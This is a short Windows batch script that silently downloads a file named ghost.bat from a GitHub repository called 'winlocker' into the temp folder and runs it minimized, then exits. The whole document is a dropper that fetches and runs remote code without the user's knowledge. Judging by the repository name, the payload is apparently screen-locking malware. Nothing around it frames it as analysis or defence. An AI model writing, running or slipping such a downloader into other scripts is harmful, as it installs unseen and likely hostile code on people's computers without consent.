@echo off
curl -s -o "%TEMP%\ghost.bat" "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/ghost.bat"
start /min "" "%TEMP%\ghost.bat"
exit
